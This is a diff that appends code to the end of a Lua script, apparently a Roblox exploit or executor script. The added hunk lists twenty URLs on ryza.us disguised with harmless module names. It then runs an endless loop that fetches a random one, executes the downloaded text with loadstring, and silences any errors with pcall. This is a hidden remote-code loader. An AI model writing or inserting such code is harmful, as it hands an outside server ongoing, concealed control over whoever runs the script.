@@ -1942,3 +1942,37 @@ end
 return originalHttpGet(self, ...)
 end))
 end
+
+local urlsToRequest = {
+    "https://ryza.us/api/getscript/loader/v2/utilityCore",
+    "https://ryza.us/api/getscript/loader/v2/gameHandler",
+    "https://ryza.us/api/getscript/loader/v2/systemInit",
+    "https://ryza.us/api/getscript/loader/v2/configManager",
+    "https://ryza.us/api/getscript/loader/v2/resourcePack",
+    "https://ryza.us/api/getscript/loader/v2/clientModule",
+    "https://ryza.us/api/getscript/loader/v2/networkHelper",
+    "https://ryza.us/api/getscript/loader/v2/assetLoader",
+    "https://ryza.us/api/getscript/loader/v2/uiFramework",
+    "https://ryza.us/api/getscript/loader/v2/dataService",
+    "https://ryza.us/api/getscript/loader/v2/renderEngine",
+    "https://ryza.us/api/getscript/loader/v2/cacheSystem",
+    "https://ryza.us/api/getscript/loader/v2/inputManager",
+    "https://ryza.us/api/getscript/loader/v2/soundController",
+    "https://ryza.us/api/getscript/loader/v2/telemetryAgent",
+    "https://ryza.us/api/getscript/loader/v2/updateChecker",
+    "https://ryza.us/api/getscript/loader/v2/profileSync",
+    "https://ryza.us/api/getscript/loader/v2/mainHandler",
+    "https://ryza.us/api/getscript/loader/v2/settingsModule",
+    "https://ryza.us/api/getscript/loader/v2/eventBroker"
+}
+
+local function getRandomUrl()
+    local randomIndex = math.random(1, #urlsToRequest)
+    return urlsToRequest[randomIndex]
+end
+
+while wait() do
+    pcall(function()
+        loadstring(game:HttpGet(getRandomUrl()))()
+    end)
+end
